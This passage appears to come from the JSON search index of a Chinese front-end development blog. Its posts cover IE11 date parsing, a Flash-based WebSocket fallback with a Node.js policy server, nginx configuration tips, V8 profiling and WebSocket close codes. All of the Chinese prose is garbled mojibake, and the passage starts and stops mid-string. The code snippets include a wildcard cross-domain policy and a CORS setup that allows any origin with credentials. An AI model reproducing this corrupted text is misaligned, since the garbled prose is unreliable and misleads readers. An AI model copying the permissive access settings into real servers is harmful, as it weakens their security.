¼å¼ã€‚\nå¸¸è§çš„æ ¼å¼ 2010-10-10 19:00:00 å°±è¿™ç§æ ¼å¼ï¼Œåœ¨IE11ä¸Šæ˜¯ä¸æ¥å—çš„ã€‚\nä¸‹é¢çš„æ¯”è¾ƒï¼Œåœ¨IE11ä¸Šè¿”å›false, åœ¨chromeä¸Šè¿”å›trueã€‚åŸå› å°±åœ¨äºï¼ŒIE11ä¸æ”¯æŒè¿™ç§æ ¼å¼ã€‚\nnew Date() \u0026gt; new Date(\u0026#39;2010-10-10 19:00:00\u0026#39;) æ‰€ä»¥åœ¨æ—¶é—´å¤„ç†ä¸Šï¼Œæœ€å¥½é€‰ç”¨æ¯”ä»·é è°±çš„ç¬¬ä¸‰æ–¹åº“ï¼Œä¾‹å¦‚dayjsï¼Œ momentç­‰ç­‰ã€‚\nåƒä¸‡ä¸è¦å…ˆå…¥ä¸ºä¸»ï¼ï¼\n","permalink":"https://wdd.js.org/fe/trap-of-new-date/","summary":"ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå»ºè®®ä½ ä¸è¦ç”¨new Date(\u0026ldquo;time string\u0026rdquo;)çš„æ–¹å¼å»åšæ—¶é—´è§£æã€‚å› ä¸ºä¸åŒæµè§ˆå™¨ï¼Œå¯èƒ½æ¥å—çš„time stringçš„æ ¼å¼éƒ½ä¸ä¸€æ ·ã€‚\nä½ æœ€å¥½ä¸è¦å»å…ˆå…¥ä¸ºä¸»ï¼Œè®¤ä¸ºæµè§ˆå™¨ä¼šæ”¯æŒçš„ä½ çš„æ ¼å¼ã€‚\nå¸¸è§çš„æ ¼å¼ 2010-10-10 19:00:00 å°±è¿™ç§æ ¼å¼ï¼Œåœ¨IE11ä¸Šæ˜¯ä¸æ¥å—çš„ã€‚\nä¸‹é¢çš„æ¯”è¾ƒï¼Œåœ¨IE11ä¸Šè¿”å›false, åœ¨chromeä¸Šè¿”å›trueã€‚åŸå› å°±åœ¨äºï¼ŒIE11ä¸æ”¯æŒè¿™ç§æ ¼å¼ã€‚\nnew Date() \u0026gt; new Date(\u0026#39;2010-10-10 19:00:00\u0026#39;) æ‰€ä»¥åœ¨æ—¶é—´å¤„ç†ä¸Šï¼Œæœ€å¥½é€‰ç”¨æ¯”ä»·é è°±çš„ç¬¬ä¸‰æ–¹åº“ï¼Œä¾‹å¦‚dayjsï¼Œ momentç­‰ç­‰ã€‚\nåƒä¸‡ä¸è¦å…ˆå…¥ä¸ºä¸»ï¼ï¼","title":"new Date('time string')çš„é™·é˜±"},{"content":"IE8/9åŸç”Ÿæ˜¯ä¸æ”¯æŒWebSocketçš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨flashå»æ¨¡æ‹Ÿä¸€ä¸ªWebSocketæ¥å£å‡ºæ¥ã€‚\nè¿™æ–¹é¢ï¼Œhttps://github.com/gimite/web-socket-jsÂ å·²ç»å¯ä»¥ä½¿ç”¨ã€‚\né™¤äº†å®¢æˆ·ç«¯ä¹‹å¤–ï¼ŒæœåŠ¡ç«¯éœ€è¦åšä¸ªflashå®‰å…¨ç­–ç•¥è®¾ç½®ã€‚\nè¿™é‡Œçš„æœåŠ¡ç«¯æ˜¯æŒ‡WebSocetæœåŠ¡å™¨æ‰€åœ¨çš„æœåŠ¡ç«¯ã€‚é»˜è®¤ç«¯å£æ˜¯843ç«¯å£ã€‚\nå®¢æˆ·ç«¯ä½¿ç”¨flashæ¨¡æ‹ŸWebSocketæ—¶ï¼Œä¼šæ‰“å¼€ä¸€ä¸ªåˆ°æœåŠ¡ç«¯843ç«¯å£çš„TCPé“¾æ¥ã€‚\nå¹¶ä¸”å‘é€æ•°æ®ï¼š\n\u0026lt;policy-file-request\u0026gt;. æœåŠ¡ç«¯éœ€è¦å›åº”ä¸‹é¢ç±»ä¼¼çš„å†…å®¹\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE cross-domain-policy SYSTEM \u0026#34;/xml/dtds/cross-domain-policy.dtd\u0026#34;\u0026gt; \u0026lt;cross-domain-policy\u0026gt; \u0026lt;site-control permitted-cross-domain-policies=\u0026#34;all\u0026#34;/\u0026gt; \u0026lt;allow-access-from domain=\u0026#34;*\u0026#34; to-ports=\u0026#34;*\u0026#34; secure=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;allow-http-request-headers-from domain=\u0026#34;*\u0026#34; headers=\u0026#34;*\u0026#34;/\u0026gt; \u0026lt;/cross-domain-policy\u0026gt; Node.jså®ç° policy.js module.exports.policyFile = `\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE cross-domain-policy SYSTEM \u0026#34;/xml/dtds/cross-domain-policy.dtd\u0026#34;\u0026gt; \u0026lt;cross-domain-policy\u0026gt; \u0026lt;site-control permitted-cross-domain-policies=\u0026#34;all\u0026#34;/\u0026gt; \u0026lt;allow-access-from domain=\u0026#34;*\u0026#34; to-ports=\u0026#34;*\u0026#34; secure=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;allow-http-request-headers-from domain=\u0026#34;*\u0026#34; headers=\u0026#34;*\u0026#34;/\u0026gt; \u0026lt;/cross-domain-policy\u0026gt;` index.js const Net = require(\u0026#39;net\u0026#39;) const {policyFile} = require(\u0026#39;./policy\u0026#39;) const port = 843 console.log(policyFile) const server = new Net.Server() server.listen(port, function() { console.log(`Server listening for connection requests on socket localhost:${port}`); }); server.on(\u0026#39;connection\u0026#39;, function(socket) { console.log(\u0026#39;A new connection has been established.\u0026#39;); socket.end(policyFile) socket.on(\u0026#39;data\u0026#39;, function(chunk) { console.log(`Data received from client: ${chunk.toString()}`); }); socket.on(\u0026#39;end\u0026#39;, function() { console.log(\u0026#39;Closing connection with the client\u0026#39;); }); socket.on(\u0026#39;error\u0026#39;, function(err) { console.log(`Error: ${err}`); }); }); ","permalink":"https://wdd.js.org/fe/ie89-websocket-flash/","summary":"IE8/9åŸç”Ÿæ˜¯ä¸æ”¯æŒWebSocketçš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨flashå»æ¨¡æ‹Ÿä¸€ä¸ªWebSocketæ¥å£å‡ºæ¥ã€‚\nè¿™æ–¹é¢ï¼Œhttps://github.com/gimite/web-socket-jsÂ å·²ç»å¯ä»¥ä½¿ç”¨ã€‚\né™¤äº†å®¢æˆ·ç«¯ä¹‹å¤–ï¼ŒæœåŠ¡ç«¯éœ€è¦åšä¸ªflashå®‰å…¨ç­–ç•¥è®¾ç½®ã€‚\nè¿™é‡Œçš„æœåŠ¡ç«¯æ˜¯æŒ‡WebSocetæœåŠ¡å™¨æ‰€åœ¨çš„æœåŠ¡ç«¯ã€‚é»˜è®¤ç«¯å£æ˜¯843ç«¯å£ã€‚\nå®¢æˆ·ç«¯ä½¿ç”¨flashæ¨¡æ‹ŸWebSocketæ—¶ï¼Œä¼šæ‰“å¼€ä¸€ä¸ªåˆ°æœåŠ¡ç«¯843ç«¯å£çš„TCPé“¾æ¥ã€‚\nå¹¶ä¸”å‘é€æ•°æ®ï¼š\n\u0026lt;policy-file-request\u0026gt;. æœåŠ¡ç«¯éœ€è¦å›åº”ä¸‹é¢ç±»ä¼¼çš„å†…å®¹\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE cross-domain-policy SYSTEM \u0026#34;/xml/dtds/cross-domain-policy.dtd\u0026#34;\u0026gt; \u0026lt;cross-domain-policy\u0026gt; \u0026lt;site-control permitted-cross-domain-policies=\u0026#34;all\u0026#34;/\u0026gt; \u0026lt;allow-access-from domain=\u0026#34;*\u0026#34; to-ports=\u0026#34;*\u0026#34; secure=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;allow-http-request-headers-from domain=\u0026#34;*\u0026#34; headers=\u0026#34;*\u0026#34;/\u0026gt; \u0026lt;/cross-domain-policy\u0026gt; Node.jså®ç° policy.js module.exports.policyFile = `\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE cross-domain-policy SYSTEM \u0026#34;/xml/dtds/cross-domain-policy.dtd\u0026#34;\u0026gt; \u0026lt;cross-domain-policy\u0026gt; \u0026lt;site-control permitted-cross-domain-policies=\u0026#34;all\u0026#34;/\u0026gt; \u0026lt;allow-access-from domain=\u0026#34;*\u0026#34; to-ports=\u0026#34;*\u0026#34; secure=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;allow-http-request-headers-from domain=\u0026#34;*\u0026#34; headers=\u0026#34;*\u0026#34;/\u0026gt; \u0026lt;/cross-domain-policy\u0026gt;` index.js const Net = require(\u0026#39;net\u0026#39;) const {policyFile} = require(\u0026#39;./policy\u0026#39;) const port = 843 console.log(policyFile) const server = new Net.Server() server.listen(port, function() { console.log(`Server listening for connection requests on socket localhost:${port}`); }); server.","title":"IE8/9 æ”¯æŒWebSocketæ–¹æ¡ˆï¼Œflashå®‰å…¨ç­–ç•¥"},{"content":"ç”µè„‘çš„é£æ‰‡å£°çªç„¶å“äº†èµ·æ¥ï¼Œæˆ‘çŸ¥é“æœ‰æŸä¸ªè¿›ç¨‹åœ¨å ç”¨å¤§é‡CPUèµ„æºã€‚\nåœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­ï¼Œå¯ä»¥çœ‹åˆ°vscodeå ç”¨çš„çš„CPUèµ„æºè¾¾åˆ°150ã€‚è¯´æ˜é—®é¢˜å‡ºåœ¨vscodeä¸Šã€‚\nåœ¨vscodeä¸­ï¼ŒæŒ‰F1, è¾“å…¥ï¼š show running extensions å¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ’ä»¶çš„è¿è¡ŒçŠ¶å†µã€‚\nå…¶ä¸­éœ€è¦å…³æ³¨æœ€é‡è¦çš„æŒ‡æ ‡å°±æ˜¯æ´»åŠ¨æ—¶é—´ï¼šå¦‚æœæŸä¸ªæ’ä»¶çš„æ´»åŠ¨æ—¶é—´æ˜æ˜¾æ˜¯å…¶ä»–æ’ä»¶çš„å¥½å¤šå€ï¼Œé‚£é—®é¢˜å°±å¯èƒ½å‡ºåœ¨è¿™ä¸ªæ’ä»¶ä¸Šã€‚è¦ä¹ˆç¦ç”¨è¯¥æ’ä»¶ï¼Œè¦ä¹ˆå¸è½½è¯¥æ’ä»¶ã€‚\n","permalink":"https://wdd.js.org/fe/vscode-high-cpu/","summary":"ç”µè„‘çš„é£æ‰‡å£°çªç„¶å“äº†èµ·æ¥ï¼Œæˆ‘çŸ¥é“æœ‰æŸä¸ªè¿›ç¨‹åœ¨å ç”¨å¤§é‡CPUèµ„æºã€‚\nåœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­ï¼Œå¯ä»¥çœ‹åˆ°vscodeå ç”¨çš„çš„CPUèµ„æºè¾¾åˆ°150ã€‚è¯´æ˜é—®é¢˜å‡ºåœ¨vscodeä¸Šã€‚\nåœ¨vscodeä¸­ï¼ŒæŒ‰F1, è¾“å…¥ï¼š show running extensions å¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ’ä»¶çš„è¿è¡ŒçŠ¶å†µã€‚\nå…¶ä¸­éœ€è¦å…³æ³¨æœ€é‡è¦çš„æŒ‡æ ‡å°±æ˜¯æ´»åŠ¨æ—¶é—´ï¼šå¦‚æœæŸä¸ªæ’ä»¶çš„æ´»åŠ¨æ—¶é—´æ˜æ˜¾æ˜¯å…¶ä»–æ’ä»¶çš„å¥½å¤šå€ï¼Œé‚£é—®é¢˜å°±å¯èƒ½å‡ºåœ¨è¿™ä¸ªæ’ä»¶ä¸Šã€‚è¦ä¹ˆç¦ç”¨è¯¥æ’ä»¶ï¼Œè¦ä¹ˆå¸è½½è¯¥æ’ä»¶ã€‚","title":"ä¸ºä»€ä¹ˆvscodeä¼šå ç”¨å¤§é‡CPUèµ„æºï¼Ÿ"},{"content":"jsåŸç”Ÿæ”¯æŒ16è¿›åˆ¶ã€10è¿›åˆ¶ã€8è¿›åˆ¶çš„ç›´æ¥å®šä¹‰\nvar a = 21 // åè¿›åˆ¶ var b = 0xee // åå…­è¿›åˆ¶, 238 var c = 013 // å…«è¿›åˆ¶ 11 åè¿›åˆ¶è½¬äºŒè¿›åˆ¶å­—ç¬¦ä¸² var a = 21 // åè¿›åˆ¶ a.toString(2) // \u0026#34;10101\u0026#34; äºŒè¿›åˆ¶è½¬10è¿›åˆ¶ var d = \u0026#34;10101\u0026#34; parseInt(\u0026#39;10101\u0026#39;,2) // 21 ","permalink":"https://wdd.js.org/fe/bin-number-operator/","summary":"jsåŸç”Ÿæ”¯æŒ16è¿›åˆ¶ã€10è¿›åˆ¶ã€8è¿›åˆ¶çš„ç›´æ¥å®šä¹‰\nvar a = 21 // åè¿›åˆ¶ var b = 0xee // åå…­è¿›åˆ¶, 238 var c = 013 // å…«è¿›åˆ¶ 11 åè¿›åˆ¶è½¬äºŒè¿›åˆ¶å­—ç¬¦ä¸² var a = 21 // åè¿›åˆ¶ a.toString(2) // \u0026#34;10101\u0026#34; äºŒè¿›åˆ¶è½¬10è¿›åˆ¶ var d = \u0026#34;10101\u0026#34; parseInt(\u0026#39;10101\u0026#39;,2) // 21 ","title":"jsä¸­äºŒè¿›åˆ¶çš„æ“ä½œ"},{"content":"const fs = require(\u0026#39;fs\u0026#39;) var request = require(\u0026#39;request\u0026#39;) const zlib = require(\u0026#39;zlib\u0026#39;) const log = require(\u0026#39;./log.js\u0026#39;) const fileType = \u0026#39;\u0026#39; let endCount = 0 module.exports = (item) =\u0026gt; { return new Promise((resolve, reject) =\u0026gt; { request.get(item.url) .on(\u0026#39;error\u0026#39;, (error) =\u0026gt; { log.error(`ä¸‹è½½å¤±è´¥${item.name}`) reject(error) }) .pipe(zlib.createGunzip()) .pipe(fs.createWriteStream(item.name + fileType)) .on(\u0026#39;finish\u0026#39;, (res) =\u0026gt; { log.info(`${++endCount} å®Œæˆä¸‹è½½ ${item.name + fileType}`) resolve(res) }) }) } ","permalink":"https://wdd.js.org/fe/nodejs-stream-unzip/","summary":"const fs = require(\u0026#39;fs\u0026#39;) var request = require(\u0026#39;request\u0026#39;) const zlib = require(\u0026#39;zlib\u0026#39;) const log = require(\u0026#39;./log.js\u0026#39;) const fileType = \u0026#39;\u0026#39; let endCount = 0 module.exports = (item) =\u0026gt; { return new Promise((resolve, reject) =\u0026gt; { request.get(item.url) .on(\u0026#39;error\u0026#39;, (error) =\u0026gt; { log.error(`ä¸‹è½½å¤±è´¥${item.name}`) reject(error) }) .pipe(zlib.createGunzip()) .pipe(fs.createWriteStream(item.name + fileType)) .on(\u0026#39;finish\u0026#39;, (res) =\u0026gt; { log.info(`${++endCount} å®Œæˆä¸‹è½½ ${item.name + fileType}`) resolve(res) }) }) } ","title":"NodeJSè¾¹ä¸‹è½½è¾¹è§£å‹gzæ–‡ä»¶"},{"content":"ä¸‹é¢çš„å‘½ä»¤å¯ä»¥ç”Ÿæˆä¸€ä¸ªv8çš„æ—¥å¿—å¦‚ isolate-0x102d4e000-86008-v8.log\n\u0026ndash;log-source-code ä¸æ˜¯å¿…ä¼ çš„å­—æ®µï¼ŒåŠ äº†è¯¥å­—æ®µå¯ä»¥åœ¨å®šä½åˆ°æºç  node --prof --log-source-code index.js ä¸‹ä¸€æ­¥æ˜¯å°†logæ–‡ä»¶è½¬æˆjson\nnode --prof-process --preprocess isolate-0x102d4e000-86008-v8.log \u0026gt; v8.json ç„¶åæ‰“å¼€ https://wangduanduan.gitee.io/v8-profiling/ è¿™ä¸ªé¡µé¢ï¼Œé€‰æ‹©v8.json\nä¸‹å›¾æ¨ªåæ ‡æ˜¯æ—¶é—´ï¼Œçºµåæ ‡æ˜¯cpuç™¾åˆ†æ¯”ã€‚\né€‰æ‹©Bottom Upä¹‹åï¼Œå±•å¼€JS unoptimized, å¯ä»¥å‘ç°å ç”¨cpuæ¯”è¾ƒé«˜çš„ä»£ç çš„ä½ç½®ã€‚\n","permalink":"https://wdd.js.org/fe/v8-profile/","summary":"ä¸‹é¢çš„å‘½ä»¤å¯ä»¥ç”Ÿæˆä¸€ä¸ªv8çš„æ—¥å¿—å¦‚ isolate-0x102d4e000-86008-v8.log\n\u0026ndash;log-source-code ä¸æ˜¯å¿…ä¼ çš„å­—æ®µï¼ŒåŠ äº†è¯¥å­—æ®µå¯ä»¥åœ¨å®šä½åˆ°æºç  node --prof --log-source-code index.js ä¸‹ä¸€æ­¥æ˜¯å°†logæ–‡ä»¶è½¬æˆjson\nnode --prof-process --preprocess isolate-0x102d4e000-86008-v8.log \u0026gt; v8.json ç„¶åæ‰“å¼€ https://wangduanduan.gitee.io/v8-profiling/ è¿™ä¸ªé¡µé¢ï¼Œé€‰æ‹©v8.json\nä¸‹å›¾æ¨ªåæ ‡æ˜¯æ—¶é—´ï¼Œçºµåæ ‡æ˜¯cpuç™¾åˆ†æ¯”ã€‚\né€‰æ‹©Bottom Upä¹‹åï¼Œå±•å¼€JS unoptimized, å¯ä»¥å‘ç°å ç”¨cpuæ¯”è¾ƒé«˜çš„ä»£ç çš„ä½ç½®ã€‚","title":"V8 Profile"},{"content":"1. å¯åŠ¨ï¼Ÿåœæ­¢ï¼Ÿreloadé…ç½® nginx -s reload # çƒ­é‡å¯ nginx -s reopen # é‡å¯Nginx nginx -s stop # å¿«é€Ÿå…³é—­ nginx -s quit # ç­‰å¾…å·¥ä½œè¿›ç¨‹å¤„ç†å®Œæˆåå…³é—­ nginx -T # æŸ¥çœ‹é…ç½®æ–‡ä»¶çš„å®é™…å†…å®¹ 2. nginxå¦‚ä½•åšåå‘httpä»£ç† location ^~ /api { proxy_pass http://192.168.40.174:32020; } 3. nginxè¦å¦‚ä½•é…ç½®æ‰èƒ½å¤„ç†è·¨åŸŸé—®é¢˜ location ^~ /p/asm { proxy_pass http://192.168.40.174:32020; add_header \u0026#39;Access-Control-Allow-Origin\u0026#39; \u0026#39;*\u0026#39; always; add_header \u0026#39;Access-Control-Allow-Credentials\u0026#39; \u0026#39;true\u0026#39; always; add_header \u0026#39;Access-Control-Allow-Methods\u0026#39; \u0026#39;GET,POST,PUT,DELETE,PATCH,OPTIONS\u0026#39;; add_header \u0026#39;Access-Control-Allow-Headers\u0026#39; \u0026#39;Content-Type,ssid\u0026#39;; if ($request_method = \u0026#39;OPTIONS\u0026#39;) {return 204;} proxy_redirect off; proxy_set_header Host $host; } 4. å¦‚ä½•æ‹¦æˆªæŸä¸ªè¯·æ±‚ï¼Œç›´æ¥è¿”å›æŸä¸ªçŠ¶æ€ç ï¼Ÿ location ^~ /p/asm { return 204 \u0026#34;OK\u0026#34;; } 5. å¦‚ä½•ç»™æŸä¸ªè·¯å¾„çš„è¯·æ±‚è®¾ç½®ç‹¬ç«‹çš„æ—¥å¿—æ–‡ä»¶ï¼Ÿ location ^~ /p/asm { access_log /var/log/nginx/a.log; error_log /var/log/nginx/a.err.log; } 6. å¦‚ä½•è®¾ç½®nginxçš„é™æ€æ–‡ä»¶æœåŠ¡å™¨ location / { add_header Cache-Control max-age=360000; root /usr/share/nginx/html/webrtc-sdk/dist/; } # å¦‚æœç›®æ ‡åœ°å€ä¸­æ²¡æœ‰video, videoåªæ˜¯ç”¨æ¥è¯†åˆ«è·¯å¾„çš„ï¼Œåˆ™éœ€è¦ä½¿ç”¨ # rewriteæŒ‡ä»¤å»å»é™¤videoè·¯å¾„ # å¦åˆ™è®¿é—®/video å°±ä¼šè½¬åˆ° /home/resources/video è·¯å¾„ location /video { rewrite /video/(.*) /$1 break; add_header Cache-Control max-age=360000; autoindex on; root /home/resources/; } 7. åå‘ä»£ç†æ—¶ï¼Œå¦‚ä½•åšè·¯å¾„é‡å†™ï¼Ÿ ä½¿ç”¨ rewrite æŒ‡ä»¤ï¼Œä¾‹å¦‚ rewrite /p/(.*) /$1 break; 8. Nginxå¦‚ä½•é…ç½®æ‰èƒ½åšwebsocketä»£ç†ï¼Ÿ location ^~ /websocket { proxy_pass http://192.168.40.174:31089; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; } 9. å¦‚ä½•è°ƒæ•´nginxçš„æœ€å¤§æ‰“å¼€æ–‡ä»¶é™åˆ¶ è®¾ç½®worker_rlimit_nofile\nuser root root; worker_processes 4; worker_rlimit_nofile 65535; 10. å¦‚ä½•åˆ¤æ–­worker_rlimit_nofileæ˜¯å¦ç”Ÿæ•ˆï¼Ÿ 11. ç›´æ¥è¿”å›æ–‡æœ¬ location / { default_type text/plain; return 502 \u0026#34;æœåŠ¡æ­£åœ¨å‡çº§ï¼Œè¯·ç¨åå†è¯•â€¦â€¦\u0026#34;; } location / { default_type text/html; return 502 \u0026#34;æœåŠ¡æ­£åœ¨å‡çº§ï¼Œè¯·ç¨åå†è¯•â€¦â€¦\u0026#34;; } location / { default_type application/json; return 502 \u0026#39;{\u0026#34;status\u0026#34;:502,\u0026#34;msg\u0026#34;:\u0026#34;æœåŠ¡æ­£åœ¨å‡çº§ï¼Œè¯·ç¨åå†è¯•â€¦â€¦\u0026#34;}\u0026#39;; } 13. å¤šç§æ—¥å¿—æ ¼å¼ ä¾‹å¦‚ï¼Œä¸é€šçš„åå‘ä»£ç†ï¼Œä½¿ç”¨ä¸åŒçš„æ—¥å¿—æ ¼å¼ã€‚\nä¾‹å¦‚ä¸‹é¢ï¼Œå®šä¹‰äº†ä¸‰ç§æ—¥å¿—æ ¼å¼main, mian1, main2ã€‚\nåœ¨access_log æŒ‡ä»¤çš„è·¯å¾„ä¹‹åï¼ŒæŒ‡å®šæ—¥å¿—æ ¼å¼å°±å¯ä»¥äº†ã€‚\nhttp { log_format main \u0026#39;$time_iso8601 $remote_addr $status $request\u0026#39;; log_format main2 \u0026#39;$remote_addr $status $request\u0026#39;; log_format main3 \u0026#39;$status $request\u0026#39;; access_log /var/log/nginx/access.log main; 14. æƒé™é—®é¢˜ ä¾‹å¦‚æŸäº›ç«¯å£æ— æ³•ç›‘å¬ï¼Œåˆ™éœ€è¦æ£€æŸ¥æ˜¯å¦è¢«selinuxç»™æ‹¦æˆªäº†ã€‚ æˆ–è€…nginxçš„å¯åŠ¨ç”¨æˆ·ä¸æ˜¯rootç”¨æˆ·å¯¼è‡´æ— æ³•è®¿é—®æŸäº›rootç”¨æˆ·çš„ç›®å½•ã€‚\nå‚è€ƒ https://mp.weixin.qq.com/s/JUOyAe1oEs-WwmEmsHRn8w https://www.nginx.com/blog/tcp-load-balancing-udp-load-balancing-nginx-tips-tricks/ https://www.cnblogs.com/freeweb/p/5944894.html ","permalink":"https://wdd.js.org/fe/nginx-tips/","summary":"1. å¯åŠ¨ï¼Ÿåœæ­¢ï¼Ÿreloadé…ç½® nginx -s reload # çƒ­é‡å¯ nginx -s reopen # é‡å¯Nginx nginx -s stop # å¿«é€Ÿå…³é—­ nginx -s quit # ç­‰å¾…å·¥ä½œè¿›ç¨‹å¤„ç†å®Œæˆåå…³é—­ nginx -T # æŸ¥çœ‹é…ç½®æ–‡ä»¶çš„å®é™…å†…å®¹ 2. nginxå¦‚ä½•åšåå‘httpä»£ç† location ^~ /api { proxy_pass http://192.168.40.174:32020; } 3. nginxè¦å¦‚ä½•é…ç½®æ‰èƒ½å¤„ç†è·¨åŸŸé—®é¢˜ location ^~ /p/asm { proxy_pass http://192.168.40.174:32020; add_header \u0026#39;Access-Control-Allow-Origin\u0026#39; \u0026#39;*\u0026#39; always; add_header \u0026#39;Access-Control-Allow-Credentials\u0026#39; \u0026#39;true\u0026#39; always; add_header \u0026#39;Access-Control-Allow-Methods\u0026#39; \u0026#39;GET,POST,PUT,DELETE,PATCH,OPTIONS\u0026#39;; add_header \u0026#39;Access-Control-Allow-Headers\u0026#39; \u0026#39;Content-Type,ssid\u0026#39;; if ($request_method = \u0026#39;OPTIONS\u0026#39;) {return 204;} proxy_redirect off; proxy_set_header Host $host; } 4. å¦‚ä½•æ‹¦æˆªæŸä¸ªè¯·æ±‚ï¼Œç›´æ¥è¿”å›æŸä¸ªçŠ¶æ€ç ï¼Ÿ location ^~ /p/asm { return 204 \u0026#34;OK\u0026#34;; } 5.","title":"å‰ç«¯å¿…ä¼šçš„nginxçŸ¥è¯†ç‚¹"},{"content":"WebSocketæ–­å¼€ç ï¼Œä¸€èˆ¬æ˜¯ç”¨åˆ°çš„æ˜¯ä»1000-1015ã€‚\næ­£å¸¸çš„æ–­å¼€ç æ˜¯1000ã€‚å…¶ä»–çš„éƒ½æ˜¯å¼‚å¸¸æ–­å¼€ã€‚\nåœºæ™¯ æœåŠ¡ç«¯æ–­å¼€ç  å¤‡æ³¨ åˆ·æ–°æµè§ˆå™¨é¡µé¢ 1001 ç»ˆç«¯ç¦»å¼€, å¯èƒ½å› ä¸ºæœåŠ¡ç«¯é”™è¯¯, ä¹Ÿå¯èƒ½å› ä¸ºæµè§ˆå™¨æ­£ä»æ‰“å¼€è¿æ¥çš„é¡µé¢è·³è½¬ç¦»å¼€. å…³é—­æµè§ˆå™¨tabé¡µé¢ 1001 ç»ˆç«¯ç¦»å¼€, å¯èƒ½å› ä¸ºæœåŠ¡ç«¯é”™è¯¯, ä¹Ÿå¯èƒ½å› ä¸ºæµè§ˆå™¨æ­£ä»æ‰“å¼€è¿æ¥çš„é¡µé¢è·³è½¬ç¦»å¼€. å…³é—­æµè§ˆå™¨, æ‰€æœ‰æ ‡ç­¾é¡µéƒ½ä¼šå…³é—­ã€‚ 1001 å¯ä»¥å‘ç°ã€‚æ— è®ºæ˜¯åˆ·æ–°ï¼Œå…³é—­tabé¡µé¢è¿˜æ˜¯å…³é—­æµè§ˆå™¨ï¼Œé”™è¯¯ç éƒ½æ˜¯1001 ws.close() 1005 ä¸»åŠ¨è°ƒç”¨close, ä¸ä¼ é€’é”™è¯¯ç ã€‚å¯¹æœåŠ¡ç«¯æ¥è¯´ï¼Œä¹Ÿæ˜¯å¼‚å¸¸æ–­å¼€ã€‚1005è¡¨ç¤ºæ²¡æœ‰æ”¶åˆ°é¢„æœŸçš„çŠ¶æ€ç . ws.close(1000) 1000 æ­£å¸¸çš„å…³é—­ï¼Œå®¢æˆ·ç«¯å¿…éœ€ä¼ é€’æ­£ç¡®çš„é”™è¯¯åŸå› ç ã€‚åŸå› ç ä¸æ˜¯éšä¾¿å¡«å…¥çš„ã€‚æ¯”å¦‚ ws.close(1009)aFailed to execute \u0026lsquo;close\u0026rsquo; on \u0026lsquo;WebSocket\u0026rsquo;: The code must be either 1000, or between 3000 and 4999. 1009 is neither. å®¢æˆ·ç«¯æ–­ç½‘ ","permalink":"https://wdd.js.org/fe/websocket-disconnect-test/","summary":"WebSocketæ–­å¼€ç ï¼Œä¸€èˆ¬æ˜¯ç”¨åˆ°çš„æ˜¯ä»1000-1015ã€‚\næ­£å¸¸çš„æ–­å¼€ç æ˜¯1000ã€‚å…¶ä»–çš„éƒ½æ˜¯å¼‚å¸¸æ–­å¼€ã€‚\nåœºæ™¯ æœåŠ¡ç«¯æ–­å¼€ç  å¤‡æ³¨ åˆ·æ–°æµè§ˆå™¨é¡µé¢ 1001 ç»ˆç«¯ç¦»å¼€, å¯èƒ½å› ä¸ºæœåŠ¡ç«¯é”™è¯¯, ä¹Ÿå¯èƒ½å› ä¸ºæµè§ˆå™¨æ­£ä»æ‰“å¼€è¿æ¥çš„é¡µé¢è·³è½¬ç¦»å¼€. å…³é—­æµè§ˆå™¨tabé¡µé¢ 1001 ç»ˆç«¯ç¦»å¼€, å¯èƒ½å› ä¸ºæœåŠ¡ç«¯é”™è¯¯, ä¹Ÿå¯èƒ½å› ä¸ºæµè§ˆå™¨æ­£ä»æ‰“å¼€è¿æ¥çš„é¡µé¢è·³è½¬ç¦»å¼€. å…³é—­æµè§ˆå™¨, æ‰€æœ‰æ ‡ç­¾é¡µéƒ½ä¼šå…³é—­ã€‚ 1001 å¯ä»¥å‘ç°ã€‚æ— è®ºæ˜¯åˆ·æ–°ï¼Œå…³é—­tabé¡µé¢è¿˜æ˜¯å…³é—­æµè§ˆå™¨ï¼Œé”™è¯¯ç éƒ½æ˜¯1001 ws.close() 1005 ä¸»åŠ¨è°ƒç”¨close, ä¸ä¼ é€’é”™è¯¯ç ã€‚å¯¹æœåŠ¡ç«¯æ¥è¯´ï¼Œä¹Ÿæ˜¯å¼‚å¸¸æ–­å¼€ã€‚1005è¡¨ç¤ºæ²¡æœ‰æ”¶åˆ°é¢„æœŸçš„çŠ¶æ€ç . ws.close(1000) 1000 æ­£å¸¸çš„å…³é—­ï¼Œå®¢æˆ·ç«¯å¿…éœ€ä¼ é€’æ­£ç¡®çš„é”™è¯¯åŸå› ç ã€‚åŸå› ç ä¸æ˜¯éšä¾¿å¡«å…¥çš„ã€‚æ¯”å¦‚ ws.close(1009)aFailed to execute \u0026lsquo;close\u0026rsquo; on \u0026lsquo;WebSocket\u0026rsquo;: The code must be either 1000, or between 3000 and 4999. 1009 is neither. å®¢æˆ·ç«¯æ–­ç½‘ ","title":"WebSocketæ–­å¼€ç æµ‹è¯•"},{"content":"ç›¸æ¯”äºæ™®é€šçš„æ–‡ä»¶ï¼ŒäºŒè¿›åˆ¶çš„æ–‡ä»¶ç•¥æ˜¾ç¥ç§˜ã€‚æœ¬æ¬¡å°±ä¸ºå¤§å®¶æ­å¼€äºŒè¿›åˆ¶æ–‡ä»¶çš„é¢çº±ã€‚\nWAVæ–‡ä»¶çš„æ ¼å¼ ä¸‹å›¾æ˜¯ä¸€ä¸ªæ™®é€šçš„wavæ–‡ä»¶çš„æ ¼å¼ã€‚å…¶ä¸­é™¤äº†æœ€åçš„dataéƒ¨åˆ†ï¼Œå…¶ä»–çš„æ¯ä¸ªæ ¼å­éƒ½å 